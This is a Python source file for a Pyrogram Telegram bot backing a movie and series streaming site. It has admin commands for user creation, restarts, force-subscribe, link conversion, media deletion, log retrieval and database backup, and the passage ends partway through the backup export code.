import os
from asyncio import create_task, sleep as asleep
from urllib.parse import urlparse
from Backend.logger import LOGGER
from Backend import db
from Backend.config import Telegram
from Backend.helper.custom_filter import CustomFilters
from Backend.helper.encrypt import decode_string
from Backend.helper.metadata import metadata
from Backend.helper.pyro import clean_filename, get_readable_file_size, remove_urls
from Backend.pyrofork import StreamBot
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, ForceReply
from os import path as ospath
from pyrogram.errors import FloodWait, UserNotParticipant
from pyrogram.enums.parse_mode import ParseMode
from themoviedb import aioTMDb
from asyncio import Queue, create_task
from os import execl as osexecl
from asyncio import create_subprocess_exec, gather
from sys import executable
from aiofiles import open as aiopen
from pyrogram import enums


tmdb = aioTMDb(key=Telegram.TMDB_API, language="en-US", region="US")
# Initialize database connection
import random
import string
from passlib.context import CryptContext
from datetime import datetime, timedelta

pwd_ctx = CryptContext(schemes=["bcrypt"], deprecated="auto")

def generate_password(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

@StreamBot.on_message(filters.command("user") & filters.private & CustomFilters.owner)
async def create_user(bot: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 3:
            await message.reply_text("❌ Usage: `/user <username> <expiry_days>`", parse_mode=ParseMode.MARKDOWN)
            return

        username = args[1]
        expiry_days = int(args[2])

        users_collection = db.db["auth_users"]  # Use the Tracking database

        # Check if username already exists
        existing_user = await users_collection.find_one({"username": username})
        if existing_user:
            await message.reply_text(f"❌ User `{username}` already exists!", parse_mode=ParseMode.MARKDOWN)
            return

        password = generate_password()
        hashed_password = pwd_ctx.hash(password)
        expires_at = datetime.utcnow() + timedelta(days=expiry_days)

        user_data = {
            "username": username,
            "password": hashed_password,
            "expires_at": expires_at
        }
        await users_collection.insert_one(user_data)

        await message.reply_text(
            f"✅ User created!\n\n"
            f"👤 Username: `{username}`\n"
            f"🔑 Password: `{password}`\n"
            f"🕒 Expires in: `{expiry_days}` days\n"
            f"📅 Expiry Date: `{expires_at.strftime('%Y-%m-%d %H:%M:%S')} UTC`",
            parse_mode=ParseMode.MARKDOWN
        )

    except Exception as e:
        LOGGER.error(f"Error in /user command: {e}")
        await message.reply_text("❌ An error occurred while creating the user.")

@StreamBot.on_message(filters.command('restart') & filters.private & CustomFilters.owner)
async def restart(bot: Client, message: Message):
    try:
        # Notify the user that the bot is restarting
        
        restart_message = await message.reply_text(
    '<blockquote>⚙️ Restarting Backend API... \n\n✨ Please wait as we bring everything back online! 🚀</blockquote>',
        quote=True,
        parse_mode=enums.ParseMode.HTML
        )
        LOGGER.info("Restart initiated by owner.")

        # Run the update script
        proc1 = await create_subprocess_exec('python3', 'update.py')
        await gather(proc1.wait())

        # Save restart message details for notification after restart
        async with aiopen(".restartmsg", "w") as f:
            await f.write(f"{restart_message.chat.id}\n{restart_message.id}\n")

        # Restart the bot process
        osexecl(executable, executable, "-m", "Backend")

    except Exception as e:
        LOGGER.error(f"Error during restart: {e}")
        await message.reply_text("**❌ Failed to restart. Check logs for details.**")

async def delete_messages_after_delay(messages):
    await asleep(300)  
    for msg in messages:
        try:
            await msg.delete()
        except Exception as e:
            LOGGER.error(f"Error deleting message {msg.id}: {e}")
        await asleep(2)  

@StreamBot.on_message(filters.command('start') & filters.private)
async def start(bot: Client, message: Message):
    LOGGER.info(f"Received command: {message.text}")
    
    # Force Subscribe Check
    settings = await db.get_settings()
    fsub_channel = settings.get("fsubChannel")
    
    if fsub_channel:
        try:
            await bot.get_chat_member(fsub_channel, message.from_user.id)
        except UserNotParticipant:
            try:
                chat = await bot.get_chat(fsub_channel)
                join_url = f"https://t.me/{chat.username}" if chat.username else (await bot.export_chat_invite_link(chat.id))
                
                # Check if there is data in start command to preserve
                start_data = message.text.split('start ')[-1] if 'start ' in message.text else ""
                verify_url = f"https://t.me/{(await bot.get_me()).username}?start={start_data}"
                
                return await message.reply_text(
                    f"👋 **Hello {message.from_user.first_name}!**\n\n"
                    f"To access the requested file, you must first join our update channel. "
                    f"This helps us keep you informed about new content and site updates.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("📢 Join Channel", url=join_url)],
                        [InlineKeyboardButton("🔄 Verified - Try Again", url=verify_url)]
                    ])
                )
            except Exception as e:
                LOGGER.error(f"Error in FSub join logic: {e}")
        except Exception as e:
            LOGGER.error(f"Error checking FSub membership: {e}")

    command_part = message.text.split('start ')[-1]
    
    if command_part.startswith("file_"):
        usr_cmd = command_part[len("file_"):].strip()
        
        parts = usr_cmd.split("_")
        
        if len(parts) == 2:
            try:
                tmdb_id, quality = parts
                tmdb_id = int(tmdb_id)
                season = None
                quality_details = await db.get_quality_details(tmdb_id, quality)
            except ValueError:
                LOGGER.error(f"Error parsing movie command: {usr_cmd}")
                await message.reply_text("Invalid command format for movie.")
                return
        
        elif len(parts) == 3:
            try:
                tmdb_id, season, quality = parts
                tmdb_id = int(tmdb_id)
                season = int(season)
                quality_details = await db.get_quality_details(tmdb_id, quality, season)
            except ValueError:
                LOGGER.error(f"Error parsing TV show command: {usr_cmd}")
                await message.reply_text("Invalid command format for TV show.")
                return
        elif len(parts) == 4:
            try:
                tmdb_id, season, episode, quality = parts
                tmdb_id = int(tmdb_id)
                season = int(season)
                episode = int(episode)
                quality_details = await db.get_quality_details(tmdb_id, quality, season, episode)
            except ValueError:
                LOGGER.error(f"Error parsing TV show command: {usr_cmd}")
                await message.reply_text("Invalid command format for TV show.")
                return

        else:
            await message.reply_text("Invalid command format.")
            return

        sent_messages = []
        for detail in quality_details:
            decoded_data = await decode_string(detail['id'])
            channel = f"-100{decoded_data['chat_id']}"
            msg_id = decoded_data['msg_id']
            name = detail['name']
            if "\\n" in name and name.endswith(".mkv"):
                name = name.rsplit(".mkv", 1)[0].replace("\\n", "\n")
            try:
                file = await bot.get_messages(int(channel), int(msg_id))
                media = file.document or file.video
                if media:
                    sent_msg = await message.reply_cached_media(
                        file_id=media.file_id,
                        caption=f'{name}'
                    )
                    sent_messages.append(sent_msg)
                    await asleep(1)
            except FloodWait as e:
                LOGGER.info(f"Sleeping for {e.value}s")
                await asleep(e.value)
                await message.reply_text(f"Got Floodwait of {e.value}s")
            except Exception as e:
                LOGGER.error(f"Error retrieving/sending media: {e}")
                await message.reply_text("Error retrieving media.")

        if sent_messages:
            warning_msg = await message.reply_text(
                "Forward these files to your saved messages. These files will be deleted from the bot within 5 minutes."
            )
            sent_messages.append(warning_msg)
            create_task(delete_messages_after_delay(sent_messages))
    else:
        welcome_text = (
            f"👋 **Hello {message.from_user.first_name}!**\n\n"
            f"I am the official bot of **{settings.get('siteName', 'Movie Stream')}**.\n\n"
            "I can help you find and download your favorite movies and series directly on Telegram!"
        )
        
        buttons = [[InlineKeyboardButton("🌐 Visit Website", url=settings.get("telegramUrl", "https://t.me/ThiruXD"))]]
        if await CustomFilters.admin_filter(bot, message):
            buttons.append([InlineKeyboardButton("🎛 Admin Panel", callback_data="admin_main")])
        
        await message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(buttons))

@StreamBot.on_message(filters.command("convert") & filters.private & CustomFilters.admin)
async def convert_command(bot: Client, message: Message):
    if len(message.text.split()) < 2:
        return await message.reply_text("❌ Usage: `/convert <url>`")
    
    url = message.text.split(None, 1)[1]
    await message.reply_text(f"⏳ Processing conversion for: `{url}`...")
    
    try:
        parsed_url = urlparse(url)
        path_parts = parsed_url.path.split('/')
        if len(path_parts) >= 3 and path_parts[-2] in ('ser', 'mov') and path_parts[-1].isdigit():
            mtype = "tv" if path_parts[-2] == "ser" else "movie"
            mid = int(path_parts[-1])
            media = await db.get_media_details(mid)
            
            if not media:
                return await message.reply_text("❌ Media not found in database for this URL.")
            
            settings = await db.get_settings()
            template = settings.get("custom_template", "<b>{title} ({year})</b>\n\n{description}\n\n⭐ {rating}\n🔗 {url}")
            
            post_text = template.format(
                title=media.get('title', 'Unknown'),
                year=media.get('release_year', 'N/A'),
                rating=media.get('rating', '0.0'),
                genres=", ".join(media.get('genres', [])),
                description=media.get('description', 'No description.')[:400] + "...",
                url=url
            )
            
            await bot.send_photo(
                message.chat.id, 
                photo=media.get('poster'), 
                caption=post_text, 
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Watch Online", url=url)]])
            )
        else:
            await message.reply_text("❌ Invalid URL format.")
    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")

@StreamBot.on_message(filters.command("help") & filters.private)
async def help_command(bot: Client, message: Message):
    help_text = (
        "❓ **How to use this bot?**\n\n"
        "1. Browse our website to find content.\n"
        "2. Click the 'Watch on Telegram' buttons.\n"
        "3. I will send you the files here.\n\n"
        "📢 Join our @updates channel for latest news!"
    )
    await message.reply_text(help_text)



@StreamBot.on_message(filters.command('log') & filters.private & CustomFilters.admin)
async def start(bot: Client, message: Message):
    try:
        path = ospath.abspath('log.txt')
        return await message.reply_document(
        document=path, quote=True, disable_notification=True
        )
    except Exception as e:
        print(f"An error occurred: {e}")




# Global queue for processing file updates
file_queue = Queue()

from asyncio import Lock

# Global lock for database access
db_lock = Lock()

from Backend.helper.notification import send_log_report

async def process_file():
    while True:
        metadata_info, hash, channel, msg_id, size, title = await file_queue.get()

        # Acquire the lock before updating the database
        async with db_lock:
            updated_id = await db.insert_media(metadata_info, hash=hash, channel=channel, msg_id=msg_id, size=size, name=title)

            if updated_id:
                LOGGER.info(f"{metadata_info['media_type']} updated with ID: {updated_id}")
                # Send log report
                await send_log_report(metadata_info, mode="Automatic")
            else:
                LOGGER.info("Update failed due to validation errors.")

        file_queue.task_done()



# Start the file processing tasks (adjust the number of workers as needed)
for _ in range(1):  # Two concurrent workers
    create_task(process_file())

@StreamBot.on_message(
    filters.channel
    & (
        filters.document
        | filters.video
    )
)
async def file_receive_handler(bot: Client, message: Message):
    chat_id_str = str(message.chat.id)
    is_auth = chat_id_str in Telegram.AUTH_CHANNEL
    is_manual = chat_id_str in Telegram.MANUAL_CHANNEL

    if is_auth or is_manual:
        try:
            if message.video or message.document:
                file = message.video or message.document
                if Telegram.USE_CAPTION and message.caption:
                    title = message.caption.replace("\n", "\\n")
                else:
                    title = file.file_name or file.file_id
                
                msg_id = message.id
                hash = file.file_unique_id[:6]
                size = get_readable_file_size(file.file_size)
                channel = chat_id_str.replace("-100","")
                
                # Improve file display name filtering for manual database
                display_name = remove_urls(title)
                display_name = clean_filename(display_name)
                
                if not display_name.lower().endswith('.mkv') and not display_name.lower().endswith('.mp4'):
                    display_name += '.mkv'

                if is_manual:
                    # Save to manual database for manual linking
                    manual_data = {
                        "chat_id": int(channel),
                        "msg_id": msg_id,
                        "hash": hash,
                        "size": size,
                        "name": display_name,
                        "original_name": title
                    }
                    await db.insert_manual_file(manual_data)

                if is_auth:
                    # Proceed with automatic fetch
                    metadata_info = await metadata(clean_filename(title), message)
                    if metadata_info is not None:
                        # Add file data to the queue for processing
                        # Use the same cleaned display_name for consistency
                        await file_queue.put((metadata_info, hash, int(channel), msg_id, size, display_name))

            else:
                await message.reply_text("Not supported")
        except FloodWait as e:
            LOGGER.info(f"Sleeping for {str(e.value)}s")
            await asleep(e.value)
            await message.reply_text(text=f"Got Floodwait of {str(e.value)}s",
                                disable_web_page_preview=True, parse_mode=ParseMode.MARKDOWN)
    else:
        await message.reply(text="Channel is not in AUTH_CHANNEL")


@StreamBot.on_message(filters.command('caption') & filters.private & CustomFilters.admin)
async def toggle_caption(bot: Client, message: Message):
    try:
        Telegram.USE_CAPTION = not Telegram.USE_CAPTION
        await message.reply_text(f"Now Bot Uses {'Caption' if Telegram.USE_CAPTION else 'Filename'}")
    except Exception as e:
        print(f"An error occurred: {e}")

@StreamBot.on_message(filters.command('tmdb') & filters.private & CustomFilters.admin)
async def toggle_tmdb(bot: Client, message: Message):
    try:
        Telegram.USE_TMDB = not Telegram.USE_TMDB
        await message.reply_text(f"Now Bot Uses {'TMDB' if Telegram.USE_TMDB else 'IMDB'}")
    except Exception as e:
        print(f"An error occurred: {e}")

@StreamBot.on_message(filters.command('set') & filters.private & CustomFilters.admin)
async def set_id(bot: Client, message: Message):

    url_part = message.text.split()[1:]  # Skip the command itself

    try:
        if len(url_part) == 1:

            Telegram.USE_DEFAULT_ID = url_part[0]  # Get the first element
            await message.reply_text(f"Now Bot Uses Default URL: {Telegram.USE_DEFAULT_ID}")
        else:
            # Remove the default ID
            Telegram.USE_DEFAULT_ID = None
            await message.reply_text("Removed default ID.")
    except Exception as e:
        await message.reply_text(f"An error occurred: {e}")

@StreamBot.on_message(filters.command("fsub") & filters.private & CustomFilters.admin)
async def set_fsub(bot: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) < 2:
            return await message.reply_text("❌ Usage: `/fsub <channel_id/username>` or `/fsub off`")
        
        target = args[1]
        
        if target.lower() == "off":
            settings = await db.get_settings()
            settings["fsubChannel"] = None
            from Backend.helper.modal import SettingsSchema
            await db.update_settings(SettingsSchema(**settings))
            return await message.reply_text("✅ Force-Subscribe has been disabled.")

        # Check if bot is admin in the channel
        try:
            chat = await bot.get_chat(target)
            member = await bot.get_chat_member(chat.id, "me")
            if member.status not in (enums.ChatMemberStatus.ADMINISTRATOR, enums.ChatMemberStatus.OWNER):
                return await message.reply_text("❌ Bot is not an admin in this channel. Make me admin first!")
            
            # Update settings
            settings = await db.get_settings()
            settings["fsubChannel"] = str(chat.id) if chat.username is None else chat.username
            from Backend.helper.modal import SettingsSchema
            await db.update_settings(SettingsSchema(**settings))
            
            await message.reply_text(f"✅ Force-Subscribe successfully set to **{chat.title}** ({settings['fsubChannel']})")
            
        except Exception as e:
            await message.reply_text(f"❌ Error accesssing channel: {str(e)}")

    except Exception as e:
        LOGGER.error(f"Error in /fsub: {e}")
        await message.reply_text("❌ An internal error occurred.")





@StreamBot.on_message(filters.command("convert") & filters.private & CustomFilters.admin)
async def convert_link(bot: Client, message: Message):
    try:
        args = message.text.split()
        if len(args) < 2:
            return await message.reply_text("❌ Usage: `/convert <telegram_link>`")
        
        link = args[1]
        # Example: https://t.me/c/12345678/123 or https://t.me/channel/123
        parts = link.split("/")
        if len(parts) < 5:
            return await message.reply_text("❌ Invalid Telegram link format.")
            
        msg_id = int(parts[-1])
        chat_id_part = parts[-2]
        
        # Resolve chat_id if it's a private channel (starts with c/)
        if parts[-3] == "c":
            chat_id = int("-100" + chat_id_part)
        else:
            chat_id = chat_id_part
            
        # Get the message to find the file
        try:
            tg_msg = await bot.get_messages(chat_id, msg_id)
            if tg_msg.empty or not (tg_msg.document or tg_msg.video):
                return await message.reply_text("❌ No file found in that message.")
                
            file = tg_msg.document or tg_msg.video
            file_hash = file.file_unique_id[:6]
            
            # Search in database for this file
            # In movies
            movie = await db.movie_collection.find_one({"telegram.id": {"$regex": file_hash}})
            if movie:
                # Find the specific quality from the telegram array
                quality_detail = next((q for q in movie["telegram"] if file_hash in q["id"]), None)
                if quality_detail:
                    start_link = f"https://t.me/{(await bot.get_me()).username}?start=file_{movie['tmdb_id']}_{quality_detail['quality']}"
                    return await message.reply_text(f"✅ **Converted Link:**\n\n`{start_link}`")
            
            # In TV shows
            tv = await db.tv_collection.find_one({"seasons.episodes.telegram.id": {"$regex": file_hash}})
            if tv:
                for season in tv.get("seasons", []):
                    for episode in season.get("episodes", []):
                        quality_detail = next((q for q in episode.get("telegram", []) if file_hash in q["id"]), None)
                        if quality_detail:
                            if "episode_number" in episode:
                                start_link = f"https://t.me/{(await bot.get_me()).username}?start=file_{tv['tmdb_id']}_{season['season_number']}_{episode['episode_number']}_{quality_detail['quality']}"
                            else:
                                start_link = f"https://t.me/{(await bot.get_me()).username}?start=file_{tv['tmdb_id']}_{season['season_number']}_{quality_detail['quality']}"
                            return await message.reply_text(f"✅ **Converted Link:**\n\n`{start_link}`")
            
            return await message.reply_text("❌ File found but it's not linked in the database.")
            
        except Exception as e:
            return await message.reply_text(f"❌ Error fetching message: {str(e)}")

    except Exception as e:
        LOGGER.error(f"Error in /convert: {e}")
        await message.reply_text(f"❌ An error occurred: {str(e)}")

@StreamBot.on_message(filters.command('delete') & filters.private & CustomFilters.admin)
async def delete(bot: Client, message: Message):
    try:
        split_text = message.text.split()
        if len(split_text) != 2:
            return await message.reply_text("Use this format: /delete https://domain/ser/3123")
        
        url = split_text[1]
        parsed_url = urlparse(url)
        path_parts = parsed_url.path.split('/')
        
        if len(path_parts) >= 3 and path_parts[-2] in ('ser', 'mov') and path_parts[-1].isdigit():
            media_type = path_parts[-2]
            if media_type == "ser": media_type = "tv"
            tmdb_id = path_parts[-1]
            delete = await db.delete_document(media_type, int(tmdb_id))
            if delete:
                return await message.reply_text(f"{media_type} with ID {tmdb_id} has been deleted successfully.")
            else:
                return await message.reply_text(f"ID {tmdb_id} wasn't found in the database.")
        else:
            return await message.reply_text("The URL format is incorrect.")
    
    except Exception as e:
        await message.reply_text(f"An error occurred: {str(e)}")

@StreamBot.on_message(filters.command("admin") & filters.private & CustomFilters.admin)
async def admin_panel(bot: Client, message: Message):
    try:
        total_movies = await db.movie_collection.count_documents({})
        total_tv = await db.tv_collection.count_documents({})
        total_unlinked = await db.manual_collection.count_documents({"is_linked": {"$ne": True}})
        
        text = (
            "<b>🎛 Admin Control Panel</b>\n\n"
            f"<b>🎬 Total Movies:</b> <code>{total_movies}</code>\n"
            f"<b>📺 Total TV Shows:</b> <code>{total_tv}</code>\n"
            f"<b>📁 Unlinked Files:</b> <code>{total_unlinked}</code>\n"
        )
        
        reply_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 System Stats", callback_data="admin_stats"),
             InlineKeyboardButton("📺 Browse & CMS", callback_data="admin_browse")],
            [InlineKeyboardButton("💾 Site Backup", callback_data="admin_backup"),
             InlineKeyboardButton("📢 Ads Manager", callback_data="admin_ads")],
            [InlineKeyboardButton("⚙️ Bot Settings", callback_data="admin_settings"),
             InlineKeyboardButton("🔔 Force Sub", callback_data="admin_fsub")],
            [InlineKeyboardButton("📜 System Logs", callback_data="admin_logs"),
             InlineKeyboardButton("🔄 Restart Bot", callback_data="admin_restart")]
        ])
        
        if isinstance(message, Message):
            await message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
        else: # CallbackQuery mock-like call from callback_handler
            try:
                await bot.edit_message_text(message.message.chat.id, message.message.id, text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
            except:
                await bot.send_message(message.message.chat.id, text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except Exception as e:
        LOGGER.error(f"Error in /admin: {e}")
        await message.reply_text("❌ Failed to load admin panel.")

@StreamBot.on_callback_query()
async def callback_handler(bot: Client, query):
    if not await CustomFilters.admin_filter(bot, query):
        return await query.answer("❌ You are not an admin!", show_alert=True)
        
    data = query.data
    from pyrogram.errors import MessageNotModified
    
    try:
        if data == "admin_stats":
            analytics = await db.get_analytics()
            stats = analytics.get('stats', {})
            text = (
                "<b>📊 Detailed System Analytics</b>\n\n"
                f"🎬 <b>Movies:</b> <code>{stats.get('movies', 0)}</code>\n"
                f"📺 <b>TV Shows:</b> <code>{stats.get('tv_shows', 0)}</code>\n"
                f"📁 <b>Unlinked:</b> <code>{stats.get('manual_files', 0)}</code>\n\n"
                f"📈 <b>Today's Views:</b> <code>{stats.get('today_views', 0)}</code>\n"
                f"📉 <b>Yesterday's Views:</b> <code>{stats.get('yesterday_views', 0)}</code>\n"
                f"📅 <b>Monthly Views:</b> <code>{stats.get('monthly_views', 0)}</code>\n"
                f"🌍 <b>Total Views:</b> <code>{stats.get('total_views', 0)}</code>"
            )
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="admin_main")]]), parse_mode=ParseMode.HTML)
            
        elif data == "admin_logs":
            text = "<b>📜 System Logs</b>\n\nHow would you like to receive the logs?"
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("📂 Download File", callback_data="logs_file"),
                 InlineKeyboardButton("🔗 Batbin Link", callback_data="logs_pastebin")],
                [InlineKeyboardButton("📝 View as Text", callback_data="logs_text")],
                [InlineKeyboardButton("⬅️ Back to Home", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data.startswith("logs_"):
            log_type = data.split("_")[1]
            path = ospath.abspath('log.txt')
            if not ospath.exists(path):
                return await query.answer("❌ Log file not found!", show_alert=True)
            
            if log_type == "file":
                await bot.send_document(query.message.chat.id, path, caption="Current Log File")
                await query.answer("✅ Logs sent as file.")
            elif log_type == "text":
                async with aiopen(path, 'r') as f:
                    content = await f.read()
                await bot.send_message(query.message.chat.id, f"<b>📜 System Logs</b>\n\n<code>{content[-3000:]}</code>", parse_mode=ParseMode.HTML)
                await query.answer("✅ Latest logs sent as text.")
        elif data == "logs_pastebin":
            await query.answer("⏳ Generating Batbin link...")
            try:
                async with aiopen(path, 'r') as f:
                    content = await f.read()
                import aiohttp
                async with aiohttp.ClientSession() as session:
                    async with session.post("https://batbin.me/api/v2/paste", data=content) as resp:
                        res = await resp.json()
                        paste_id = res.get('id')
                        if paste_id:
                            url = f"https://batbin.me/{paste_id}"
                            await bot.send_message(query.message.chat.id, f"✅ Logs uploaded to Batbin:\n{url}")
                        else:
                            await query.answer("❌ Failed to generate Batbin link.", show_alert=True)
            except Exception as e:
                await bot.send_message(query.message.chat.id, f"❌ Error generating Batbin link: {str(e)}")
                
        elif data.startswith("cms_manage_"):
            parts = data.split("_")
            mtype = parts[2]
            mid = parts[3]
            try:
                media = await db.get_media_details(mid)
                if not media: 
                    # Try with integer if string fails
                    media = await db.get_media_details(int(mid))
            except:
                media = None

            if not media: return await query.answer("❌ Media details not found in database!")
            
            title = media.get('title', 'Unknown')
            year = media.get('release_year', 'N/A')
            rating = media.get('rating', '0.0')
            genres = ", ".join(media.get('genres', []))
            
            text = (
                f"<b>🎬 {title} ({year})</b>\n"
                f"⭐ <b>Rating:</b> {rating}\n"
                f"🎭 <b>Genres:</b> {genres}\n"
                f"<b>ID:</b> <code>{mid}</code>\n\n"
                "Manage this content:"
            )
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("📝 Edit Metadata", callback_data=f"cms_edit_{mtype}_{mid}")],
                [InlineKeyboardButton("📤 Convert to Post", callback_data=f"cms_post_{mtype}_{mid}")],
                [InlineKeyboardButton("🗑️ Delete Media", callback_data=f"cms_delete_{mtype}_{mid}")],
                [InlineKeyboardButton("⬅️ Back", callback_data=f"browse_{mtype}_1_rating")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data.startswith("cms_delete_"):
            parts = data.split("_")
            mtype = parts[2]
            mid = parts[3]
            text = f"<b>🚨 Confirm Deletion</b>\n\nAre you sure you want to delete this {mtype}? This action cannot be undone."
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes, Delete", callback_data=f"cms_confirm_delete_{mtype}_{mid}")],
                [InlineKeyboardButton("⬅️ Cancel", callback_data=f"cms_manage_{mtype}_{mid}")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data.startswith("cms_confirm_delete_"):
            parts = data.split("_")
            mtype = parts[3]
            mid = parts[4]
            success = await db.delete_document(mtype, mid)
            if success:
                await query.answer("✅ Media deleted successfully!", show_alert=True)
                await callback_handler(bot, type('obj', (object,), {'data': 'admin_browse', 'message': query.message, 'answer': query.answer, 'edit_message_text': query.edit_message_text, 'matches': query.matches}))
            else:
                await query.answer("❌ Deletion failed!")

        elif data.startswith("cms_convert_msg_"):
            parts = data.split("_")
            mtype = parts[3]
            mid = parts[4]
            media = await db.get_media_details(mid)
            if not media: return await query.answer("❌ Media not found!")
            
            settings = await db.get_settings()
            template = settings.get("custom_template", "<b>{title} ({year})</b>\n\n{description}\n\n⭐ {rating}\n🔗 {url}")
            
            # Format URL
            url = f"https://example.com/{'mov' if mtype == 'movie' else 'ser'}/{mid}"
            
            post_text = template.format(
                title=media.get('title', 'Unknown'),
                year=media.get('release_year', 'N/A'),
                rating=media.get('rating', '0.0'),
                genres=", ".join(media.get('genres', [])),
                description=media.get('description', 'No description.')[:400] + "...",
                url=url
            )
            
            await bot.send_photo(
                query.message.chat.id, 
                photo=media.get('poster'), 
                caption=post_text, 
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Watch Online", url=url)]])
            )
            await query.answer("✅ Post preview generated!")

        elif data == "admin_settings":
            settings = await db.get_settings()
            text = (
                "<b>⚙️ Bot Configuration</b>\n\n"
                f"• <b>Captions:</b> {'✅ Enabled' if Telegram.USE_CAPTION else '❌ Disabled'}\n"
                f"• <b>TMDB Mode:</b> {'✅ Active' if Telegram.USE_TMDB else '❌ Archive'}\n"
                f"• <b>Site Title:</b> <code>{settings.get('site_title', 'Not Set')}</code>\n"
                f"• <b>Shortener:</b> <code>{settings.get('shortener_url', 'Not Set')}</code>"
            )
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"{'🚫 Disable' if Telegram.USE_CAPTION else '✅ Enable'} Captions", callback_data="toggle_caption")],
                [InlineKeyboardButton("🌐 Site Identity", callback_data="settings_edit_identity")],
                [InlineKeyboardButton("🔗 Link Shortener", callback_data="settings_edit_shortener")],
                [InlineKeyboardButton("📝 Post Template", callback_data="settings_edit_template")],
                [InlineKeyboardButton("⬅️ Back to Home", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data == "settings_edit_identity":
            text = "<b>🌐 Edit Site Identity</b>\n\nPlease send the Site Title and Description separated by a pipe (`|`).\n\nExample: `My Movie Stream | The best movie streaming bot`"
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "settings_edit_shortener":
            text = "<b>🔗 Edit Link Shortener</b>\n\nPlease send the Shortener URL and API Key separated by a pipe (`|`).\n\nExample: `https://gplinks.in | 1234567890abcdef`"
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "settings_edit_template":
            settings = await db.get_settings()
            current_template = settings.get("custom_template", "No template set.")
            text = (
                "<b>📝 Custom Post Template</b>\n\n"
                "Please send the new template for the `/convert` command.\n"
                "Available placeholders: `{title}`, `{year}`, `{rating}`, `{genres}`, `{description}`, `{url}`\n\n"
                f"<b>Current Template:</b>\n<code>{current_template}</code>"
            )
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "admin_fsub":
            settings = await db.get_settings()
            current = settings.get('fsubChannel', 'Disabled')
            text = f"<b>🔔 Force-Subscribe Settings</b>\n\n<b>Current Channel:</b> <code>{current}</code>"
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("👁️ View Channel", url=f"https://t.me/{current}" if current != "Disabled" else "tg://resolve?domain=telegram")],
                [InlineKeyboardButton("✏️ Edit F-Sub", callback_data="fsub_edit")],
                [InlineKeyboardButton("⬅️ Back to Home", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data == "fsub_edit":
            text = (
                "<b>✏️ Edit Force-Subscribe</b>\n\n"
                "Please send the Username or ID of the channel.\n"
                "Send `off` to disable Force-Subscribe.\n\n"
                "<i>Ensure the bot is an admin in the channel.</i>"
            )
            await query.message.delete()
            await bot.send_message(query.message.chat.id, text, reply_markup=ForceReply(selective=True), parse_mode=ParseMode.HTML)

        elif data == "admin_back" or data == "admin_main":
            await admin_panel(bot, query)
            # No need to delete message here if we are editing it in admin_panel

        elif data == "admin_restart":
            text = "<b>🔄 Restart Bot</b>\n\nAre you sure you want to restart the system? This will briefly disconnect all current operations."
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes, Restart", callback_data="admin_confirm_restart")],
                [InlineKeyboardButton("⬅️ Back", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data == "admin_confirm_restart":
            if not await CustomFilters.owner_filter(bot, query):
                return await query.answer("❌ Only owner can restart the bot!", show_alert=True)
            await query.answer("🔄 Restarting system...", show_alert=True)
            await restart(bot, query.message)

        elif data == "admin_backup":
            text = (
                "<b>💾 System Data Backup</b>\n\n"
                "Total Movies: <code>{m_cnt}</code>\n"
                "Total Series: <code>{t_cnt}</code>\n\n"
                "You can export your entire database as a single JSON file or import a previous backup."
            ).format(m_cnt=await db.movie_collection.count_documents({}), t_cnt=await db.tv_collection.count_documents({}))
            reply_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("📤 Create Backup", callback_data="backup_export_all")],
                [InlineKeyboardButton("📥 Restore Data", callback_data="backup_import_start")],
                [InlineKeyboardButton("⬅️ Back to Home", callback_data="admin_main")]
            ])
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

        elif data == "backup_export_all":
            msg = await query.edit_message_text("<b>💾 Preparation Backup...</b>\n[░░░░░░░░░░] 0%", parse_mode=ParseMode.HTML)
            try:
                collections = ["movies", "tv", "manual_files", "settings"]
                all_data = {}
                for i, coll_name in enumerate(collections):
                    progress = int(((i + 1) / len(collections)) * 100)
                    filled = progress // 10
                    bar = "▓" * filled + "░" * (10 - filled)
                    await msg.edit_text(f"<b>💾 Exporting {coll_name}...</b>\n[{bar}] {progress}%", parse_mode=ParseMode.HTML)
                    
                    collection = None
                    if coll_name == "movies": collection = db.movie_collection
                    elif coll_name == "tv": collection = db.tv_collection
